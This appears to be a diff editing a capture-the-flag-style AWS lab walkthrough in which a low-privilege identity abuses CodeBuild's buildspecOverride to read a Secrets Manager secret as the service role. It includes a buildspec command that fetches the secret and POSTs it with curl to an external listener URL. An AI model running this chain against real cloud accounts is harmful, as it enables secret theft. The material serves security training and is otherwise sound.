@@ -28,8 +28,8 @@ aws codebuild batch-get-projects \
   --profile bob
 ```
 
-Check environment.environmentVariables; there should be a variable with the fields `NAME`, `value`, and `type`, where `type` should be SECRETS_MANAGER. 
-Note down the `value`, its name of secret, which have to use in step4
+Check `environment.environmentVariables`; there should be a variable with the fields `name`, `value`, and `type`, where `type` is `SECRETS_MANAGER`.
+Note down the `value` field, it is the name of the target secret, and you will need it in Step 4.
 
 ---
 
@@ -58,15 +58,13 @@ version: 0.2
 phases:
   build:
     commands:
-      - VALUE=$(aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" --query "SecretString" --output text)
+      - VALUE=$(aws secretsmanager get-secret-value --secret-id <paste the value copied in Step 2> --query "SecretString" --output text)
       - curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"
 ' \
   --profile bob
 ```
 
-Note that `$SECRET_NAME` is not defined anywhere in this override. It is inherited automatically, because CodeBuild injects the project's own environment variables (the one you found in Step 2) into the build container regardless of any `buildspecOverride`.
-
-Note the `id` returned in the response — you can use it to track the build.
+Note the `id` returned in the response, you can use it to track the build.
 
 ---
 
@@ -88,7 +86,7 @@ Check your listener. The secret value (the flag) will arrive as a POST body with
 
 Example output at listener:
 ```
-{"flag":"cg-secret-flag-<cgid>"}
+{"flag":"Congratulations, you successfully injected the commands and escalated the privileges"}
 ```
 
 **Scenario complete.**
@@ -97,4 +95,4 @@ Example output at listener:
 
 ## Key Vulnerability
 
-`codebuild:BatchGetProjects` returns a project's plaintext environment variables, which here discloses the exact name of the target secret. `codebuild:StartBuild` separately accepts a `buildspecOverride` parameter that completely replaces the project's configured buildspec at runtime, while still injecting the project's own environment variables into the build. Combined with a service role that holds `secretsmanager:GetSecretValue` on `*`, an identity holding nothing more than `ListProjects`, `BatchGetProjects`, and `StartBuild` can exfiltrate the secret without ever holding Secrets Manager permissions itself.
+`codebuild:BatchGetProjects` returns a project's environment variable configuration, including the `SECRETS_MANAGER`-type reference used here, which discloses the exact name of the target secret without exposing its value. `codebuild:StartBuild` separately accepts a `buildspecOverride` parameter that completely replaces the project's configured buildspec at runtime, while still injecting the project's own environment variables into the build. Combined with a service role that holds `secretsmanager:GetSecretValue` scoped to that one secret, an identity holding nothing more than `ListProjects`, `BatchGetProjects`, and `StartBuild` can exfiltrate it without ever holding Secrets Manager permissions itself. Scoping the role down to a single secret ARN does not prevent this: the vulnerability is the buildspec override giving arbitrary command execution as that role, not the breadth of what the role can reach.
